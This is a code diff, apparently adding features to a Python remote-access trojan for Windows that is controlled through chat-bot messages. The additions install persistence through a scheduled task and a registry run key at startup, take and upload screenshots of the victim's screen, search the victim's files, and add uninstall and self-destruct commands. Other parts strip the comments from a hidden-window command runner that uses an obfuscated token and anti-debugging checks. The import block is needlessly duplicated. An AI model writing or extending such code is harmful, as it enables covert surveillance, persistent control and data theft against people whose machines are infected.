@@ -10,6 +10,22 @@ import random
 import urllib.request
 import urllib.error
 from defenses import run_defenses, check_debugger_now, secure_wipe_bytes
+from persistence import (
+    _ensure_persistence,
+    _remove_persistence,
+    _self_destruct,
+    _screenshot_to_file,
+    _file_search,
+    _PERSIST_TASK_NAME,
+)
+from persistence import (
+    _ensure_persistence,
+    _remove_persistence,
+    _self_destruct,
+    _screenshot_to_file,
+    _file_search,
+    _PERSIST_TASK_NAME,
+)
 
 # ── Anti-analysis defenses ────────────────────────────────────────────────
 # Run at startup. Exits silently if debugger/analysis tool is detected.
@@ -69,11 +85,7 @@ _LAST_MESSAGE_ID = None
 
 
 def _decode_token_bytes():
-    """
-    Decode the token from single XOR-obfuscated array into a bytearray.
-
-    Anti-debug check happens in _get_token_string() before calling this.
-    """
+    """Decode the token from XOR-obfuscated array into a bytearray."""
     global _TOKEN_XORED
     decoded = bytearray()
     for b in _TOKEN_XORED:
@@ -219,37 +231,24 @@ def _http_post(path, data=None, files=None):
 # ── Command execution (via ctypes CreateProcess for less noisy behavior) ──
 
 def _run_command(command):
-    """
-    Run a shell command using Windows CreateProcess via ctypes.
-
-    This is quieter than subprocess.run(shell=True) — no visible console
-    window, and the child process is created with specific flags.
-    Returns (success, output_text).
-    """
+    """Run a shell command using Windows CreateProcess via ctypes."""
     try:
-        # Build the command line: cmd.exe /c <command>
         cmd_line = f"cmd.exe /c {command}"
         cmd_line_bytes = cmd_line.encode("utf-8")
 
-        # STARTUPINFO — hide the window
         startup = ctypes.STARTUPINFO()
         startup.cb = ctypes.sizeof(startup)
-        startup.dwFlags = 0x1  # STARTF_USESHOWWINDOW
-        startup.wShowWindow = 0x0  # SW_HIDE
+        startup.dwFlags = 0x1
+        startup.wShowWindow = 0x0
 
-        # Process information
         proc_info = ctypes.PROCESS_INFORMATION()
 
-        # CreateProcess: run cmd.exe /c <command>
         created = ctypes.windll.kernel32.CreateProcessW(
-            None,                  # application name
-            cmd_line_bytes,        # command line (mutable buffer)
-            None,                  # process security attributes
-            None,                  # thread security attributes
-            False,                 # inherit handles
-            0x00000004,            # CREATE_NO_WINDOW — no visible console
-            None,                  # environment
-            None,                  # current directory
+            None,
+            cmd_line_bytes,
+            None, None, False,
+            0x00000004,  # CREATE_NO_WINDOW
+            None, None,
             ctypes.byref(startup),
             ctypes.byref(proc_info),
         )
@@ -257,35 +256,31 @@ def _run_command(command):
         if not created:
             return False, f"CreateProcess failed: error {ctypes.GetLastError()}"
 
-        pid = proc_info.dwProcessId
         h_process = proc_info.hProcess
         h_thread = proc_info.hThread
 
-        # Wait for the process to finish (up to 30 seconds)
         waited = ctypes.windll.kernel32.WaitForSingleObject(h_process, 30000)
-        if waited == 0x00000102:  # WAIT_TIMEOUT
+        if waited == 0x00000102:
             ctypes.windll.kernel32.TerminateProcess(h_process, 1)
             ctypes.windll.kernel32.CloseHandle(h_process)
             ctypes.windll.kernel32.CloseHandle(h_thread)
             return False, "Error: Command timed out after 30 seconds."
 
-        # Get exit code
         exit_code = ctypes.c_long(0)
         ctypes.windll.kernel32.GetExitCodeProcess(h_process, ctypes.byref(exit_code))
 
-        # Close handles
         ctypes.windll.kernel32.CloseHandle(h_process)
         ctypes.windll.kernel32.CloseHandle(h_thread)
 
         if exit_code.value != 0:
             return False, f"Command exited with code {exit_code.value}"
 
-        # We can't easily capture stdout/stderr with this approach.
-        # Redirect to a temp file instead.
-        tmp_out = os.path.join(os.environ.get("TEMP", "."), f"opss_exec_{COMPUTER_NAME}_{os.getpid()}.txt")
-        tmp_err = os.path.join(os.environ.get("TEMP", "."), f"opss_err_{COMPUTER_NAME}_{os.getpid()}.txt")
+        # Capture output via temp file redirection
+        tmp_out = os.path.join(os.environ.get("TEMP", "."),
+                               f"opss_exec_{COMPUTER_NAME}_{os.getpid()}.txt")
+        tmp_err = os.path.join(os.environ.get("TEMP", "."),
+                               f"opss_err_{COMPUTER_NAME}_{os.getpid()}.txt")
 
-        # Re-run with output redirection to capture output
         redirect_cmd = f'cmd.exe /c "{command}" > "{tmp_out}" 2> "{tmp_err}"'
         redirect_bytes = redirect_cmd.encode("utf-8")
 
@@ -296,13 +291,9 @@ def _run_command(command):
 
         proc2 = ctypes.PROCESS_INFORMATION()
         created2 = ctypes.windll.kernel32.CreateProcessW(
-            None,
-            redirect_bytes,
-            None, None, False,
-            0x00000004,
-            None, None,
-            ctypes.byref(startup2),
-            ctypes.byref(proc2),
+            None, redirect_bytes, None, None, False,
+            0x00000004, None, None,
+            ctypes.byref(startup2), ctypes.byref(proc2),
         )
 
         if not created2:
@@ -312,7 +303,6 @@ def _run_command(command):
         ctypes.windll.kernel32.CloseHandle(proc2.hProcess)
         ctypes.windll.kernel32.CloseHandle(proc2.hThread)
 
-        # Read the output file
         output = ""
         try:
             if os.path.exists(tmp_out):
@@ -322,7 +312,6 @@ def _run_command(command):
         except Exception:
             pass
 
-        # Read stderr if stdout was empty
         if not output:
             try:
                 if os.path.exists(tmp_err):
@@ -473,6 +462,85 @@ def _poll():
             )
             handled = True
 
+        # ── FEATURE 4: Screenshot ────────────────────────────────────────
+        elif content.strip() == "!screenshot":
+            tmp_path = f"{COMPUTER_NAME}_screenshot.bmp"
+            if _screenshot_to_file(tmp_path):
+                file_size_kb = os.path.getsize(tmp_path) / 1024
+                _send_message(
+                    f"\U0001f4f7 `[{COMPUTER_NAME}]` "
+                    f"Screenshot captured ({file_size_kb:.0f}KB). Uploading..."
+                )
+                if _send_file(
+                    tmp_path,
+                    f"\U0001f4f7 Screenshot from `[{COMPUTER_NAME}]`:",
+                ):
+                    os.remove(tmp_path)
+                else:
+                    _send_message(
+                        f"\u274c `[{COMPUTER_NAME}]` "
+                        "Screenshot upload failed."
+                    )
+                    try:
+                        os.remove(tmp_path)
+                    except Exception:
+                        pass
+            else:
+                _send_message(
+                    f"\u274c `[{COMPUTER_NAME}]` "
+                    "Failed to capture screenshot."
+                )
+            handled = True
+
+        # ── FEATURE 5: File Search ───────────────────────────────────────
+        elif content.startswith("!filesearch "):
+            parts = content[12:].split(" ", 1)
+            if len(parts) < 1:
+                continue
+            pattern = parts[0]
+            search_path = parts[1] if len(parts) > 1 else None
+            results, truncated = _file_search(pattern, search_path)
+            if not results:
+                _send_message(
+                    f"\U0001f50d `[{COMPUTER_NAME}]` "
+                    f"No files matching `{pattern}` found."
+                )
+            else:
+                header = (
+                    f"\U0001f50d `[{COMPUTER_NAME}]` "
+                    f"Found {len(results)} file(s) matching `{pattern}`"
+                    f"{' (truncated at 100)' if truncated else ''}:\n"
+                )
+                file_list = "\n".join(f"  {p}" for p in results[:50])
+                _send_message(f"```\n{header}{file_list}\n```")
+            handled = True
+
+        # ── FEATURE 6: Uninstall persistence ────────────────────────────
+        elif content.strip() == "!uninstall":
+            tasks_ok, reg_ok = _remove_persistence()
+            if tasks_ok or reg_ok:
+                _send_message(
+                    f"\u2705 `[{COMPUTER_NAME}]` "
+                    f"Persistence removed "
+                    f"(task: {tasks_ok}, registry: {reg_ok}). "
+                    "Binary remains — delete manually if desired."
+                )
+            else:
+                _send_message(
+                    f"\u26a0\ufe0f `[{COMPUTER_NAME}]` "
+                    "No persistence found to remove."
+                )
+            handled = True
+
+        # ── FEATURE 7: Self-destruct ─────────────────────────────────────
+        elif content.strip() == "!selfdestruct":
+            _send_message(
+                f"\U0001f5d1\ufe0f `[{COMPUTER_NAME}]` "
+                "Self-destructing. Removing persistence and deleting binary..."
+            )
+            _self_destruct()
+            # _self_destruct calls sys.exit(0), so this line is never reached
+
         if handled:
             newest_processed = msg_id
 
@@ -484,6 +552,9 @@ def _poll():
 
 def main():
     """Main entry point."""
+    # Ensure persistence (scheduled task + registry run key) unless disabled
+    _ensure_persistence()
+
     _send_message(
         f"\U0001f5a5\ufe0f **Windows Target [{COMPUTER_NAME}] is online.** "
         "Ready for actions."
